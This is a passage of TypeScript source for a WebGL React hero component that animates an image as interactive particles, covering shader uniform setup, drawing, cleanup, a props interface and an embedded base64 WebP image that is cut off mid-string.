  private stepSim(dt: number) {
    if (!this.n) return;
    const gl = this.gl;
    const P = this.pSim;
    const o = this.opts;
    const r = this.rect;
    const dst = 1 - this.stateIdx;
    const intro = o.reducedMotion || !o.intro ? 0 : Math.pow(1 - this.introT, 2);
    gl.bindFramebuffer(gl.FRAMEBUFFER, this.stateFb[dst]);
    gl.viewport(0, 0, TEX_W, this.texH);
    gl.disable(gl.BLEND);
    gl.useProgram(P.p);
    gl.bindVertexArray(this.vao);
    gl.activeTexture(gl.TEXTURE0);
    gl.bindTexture(gl.TEXTURE_2D, this.stateTex[this.stateIdx]);
    gl.uniform1i(P.u.uState, 0);
    gl.activeTexture(gl.TEXTURE1);
    gl.bindTexture(gl.TEXTURE_2D, this.homeTex);
    gl.uniform1i(P.u.uHome, 1);
    gl.activeTexture(gl.TEXTURE2);
    gl.bindTexture(gl.TEXTURE_2D, this.flowTex[this.flowIdx]);
    gl.uniform1i(P.u.uFlow, 2);
    gl.uniform2f(P.u.uSize, r.w, r.h);
    gl.uniform2f(P.u.uMouse, this.mouse.x - r.x, this.mouse.y - r.y);
    gl.uniform1f(P.u.uRadius, this.radiusPx());
    gl.uniform1f(P.u.uPresence, Math.max(this.presence, this.burst));
    gl.uniform1f(P.u.uStrength, this.strength() * (1 + this.burst * 1.5));
    gl.uniform1f(P.u.uSpread, clamp(o.spread, 0, 2));
    gl.uniform1f(P.u.uTurb, clamp(o.turbulence, 0, 2) * (o.reducedMotion ? 0.3 : 1));
    gl.uniform1f(P.u.uReturn, clamp(o.returnSpeed, 0, 2));
    gl.uniform1f(P.u.uTime, this.time);
    gl.uniform1f(P.u.uDt, dt);
    gl.uniform1f(P.u.uIntro, intro);
    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    this.stateIdx = dst;
    this.stateDirty = true;
  }

  private draw() {
    if (!this.ready || this.lost || this.destroyed) return;
    const gl = this.gl;
    const o = this.opts;
    const r = this.rect;
    const rm = o.reducedMotion;
    const introVis = rm || !o.intro ? 1 : Math.pow(this.introT, 2.2);
    const base = o.ambient && !rm ? clamp(o.ambientIntensity, 0, 2) : 0;
    const amb = base + this.flowing * 0.85 * clamp(o.liquid, 0, 2) * (rm ? 0.3 : 1);
    const rest = o.restStyle === "particles" ? 1 : 0;
    const [br, bg, bb] = o.bg;
    const [ir, ig, ib] = this.imgBg;
    const dpr = this.canvas.width / this.cssW;
    const pres = Math.max(this.presence, this.burst);
    const mx = this.mouse.x - r.x;
    const my = this.mouse.y - r.y;

    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
    gl.viewport(0, 0, this.canvas.width, this.canvas.height);
    gl.bindVertexArray(this.vao);
    gl.disable(gl.BLEND);

    const I = this.pImg;
    gl.useProgram(I.p);
    gl.activeTexture(gl.TEXTURE0);
    gl.bindTexture(gl.TEXTURE_2D, this.imgTex);
    gl.uniform1i(I.u.uImg, 0);
    gl.activeTexture(gl.TEXTURE1);
    gl.bindTexture(gl.TEXTURE_2D, this.flowTex[this.flowIdx]);
    gl.uniform1i(I.u.uFlow, 1);
    gl.uniform2f(I.u.uRes, this.cssW, this.cssH);
    gl.uniform1f(I.u.uDpr, dpr);
    gl.uniform4f(I.u.uRect, r.x, r.y, r.w, r.h);
    gl.uniform3f(I.u.uBg, br, bg, bb);
    gl.uniform3f(I.u.uImgBg, ir, ig, ib);
    gl.uniform2f(I.u.uMouse, mx, my);
    gl.uniform1f(I.u.uPresence, pres);
    gl.uniform1f(I.u.uRadius, this.radiusPx());
    gl.uniform1f(I.u.uStrength, this.strength());
    gl.uniform1f(I.u.uTime, this.time);
    gl.uniform1f(I.u.uAmbient, amb);
    gl.uniform1f(I.u.uIntroVis, introVis);
    gl.uniform1f(I.u.uRest, rest);
    gl.uniform1f(I.u.uAlphaMode, this.alphaMode ? 1 : 0);
    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);

    if (!this.n || (!this.stateDirty && rest === 0 && introVis >= 1)) return;

    const P = this.pPart;
    gl.useProgram(P.p);
    gl.enable(gl.BLEND);
    gl.blendFunc(gl.ONE, gl.ONE_MINUS_SRC_ALPHA);
    gl.activeTexture(gl.TEXTURE0);
    gl.bindTexture(gl.TEXTURE_2D, this.stateTex[this.stateIdx]);
    gl.uniform1i(P.u.uState, 0);
    gl.activeTexture(gl.TEXTURE1);
    gl.bindTexture(gl.TEXTURE_2D, this.homeTex);
    gl.uniform1i(P.u.uHome, 1);
    gl.activeTexture(gl.TEXTURE2);
    gl.bindTexture(gl.TEXTURE_2D, this.colTex);
    gl.uniform1i(P.u.uCol, 2);
    gl.activeTexture(gl.TEXTURE3);
    gl.bindTexture(gl.TEXTURE_2D, this.flowTex[this.flowIdx]);
    gl.uniform1i(P.u.uFlow, 3);
    gl.uniform1i(P.u.uTexW, TEX_W);
    gl.uniform4f(P.u.uRect, r.x, r.y, r.w, r.h);
    gl.uniform2f(P.u.uRes, this.cssW, this.cssH);
    gl.uniform2f(P.u.uMouse, mx, my);
    gl.uniform1f(P.u.uRadius, this.radiusPx());
    gl.uniform1f(P.u.uPresence, pres);
    const spacing = r.w / this.gridW;
    gl.uniform1f(P.u.uDot, spacing * 1.45 * clamp(o.dotSize, 0.2, 3));
    gl.uniform1f(P.u.uTime, this.time);
    gl.uniform1f(P.u.uAmbient, amb);
    gl.uniform1f(P.u.uStreak, (o.streaks ? 1 : 0) * (0.45 + 0.55 * introVis));
    gl.uniform1f(P.u.uIntroVis, introVis);
    gl.uniform1f(P.u.uRest, rest);
    gl.uniform1f(P.u.uDpr, dpr);
    if (this.alphaMode) gl.uniform3f(P.u.uTint, 1, 1, 1);
    else gl.uniform3f(P.u.uTint, br / Math.max(ir, 0.001), bg / Math.max(ig, 0.001), bb / Math.max(ib, 0.001));
    gl.drawArraysInstanced(gl.TRIANGLE_STRIP, 0, 4, this.n);
    gl.disable(gl.BLEND);
  }

  destroy() {
    this.destroyed = true;
    this.stop();
    this.canvas.removeEventListener("webglcontextlost", this.onLost);
    const gl = this.gl;
    if (!this.lost) {
      gl.deleteBuffer(this.quad);
      gl.deleteVertexArray(this.vao);
      for (const t of [...this.flowTex, ...this.stateTex, this.imgTex, this.homeTex, this.colTex]) if (t) gl.deleteTexture(t);
      for (const f of [...this.flowFb, ...this.stateFb]) gl.deleteFramebuffer(f);
      for (const p of [this.pFlow, this.pSim, this.pPart, this.pImg]) if (p) gl.deleteProgram(p.p);
    }
    gl.getExtension("WEBGL_lose_context")?.loseContext();
  }
}

/* ────────────────────────────────────────────────────────────────────
   Public API — SculptureHero
   ──────────────────────────────────────────────────────────────────── */

export interface SculptureHeroLink {
  label: string;
  href: string;
}

export interface SculptureHeroProps {
  src?: string;
  darkSrc?: string;
  mobileSrc?: string;
  mobileDarkSrc?: string;
  imageAlt?: string;
  imageBackground?: string;

  brand?: string;
  navLinks?: SculptureHeroLink[];
  navCta?: SculptureHeroLink;
  showNav?: boolean;

  eyebrow?: string;
  headline?: string;
  headlineAccent?: string;
  body?: string;
  primaryCta?: SculptureHeroLink;
  secondaryCta?: SculptureHeroLink;
  hint?: string;
  hintTouch?: string;

  background?: string;
  darkBackground?: string;
  theme?: "light" | "dark";
  onThemeChange?: (theme: "light" | "dark") => void;
  themeToggle?: boolean;
  textColor?: string;
  accentColor?: string;
  headingFont?: string;
  accentFont?: string;
  bodyFont?: string;
  loadFonts?: boolean;

  sculptureScale?: number;
  mobileSculptureScale?: number;
  sculptureX?: number;
  sculptureY?: number;

  interactive?: boolean;
  strength?: number;
  radius?: number;
  particleDensity?: number;
  dotSize?: number;
  particleSpread?: number;
  turbulence?: number;
  liquid?: number;
  streaks?: boolean;
  restStyle?: "image" | "particles";
  returnSpeed?: number;
  ambient?: boolean;
  ambientIntensity?: number;
  speed?: number;
  intro?: boolean;

  height?: string;
  backdropText?: string;
  className?: string;
  style?: React.CSSProperties;
}

const HERO_LIGHT_SRC = "data:image/webp;base64,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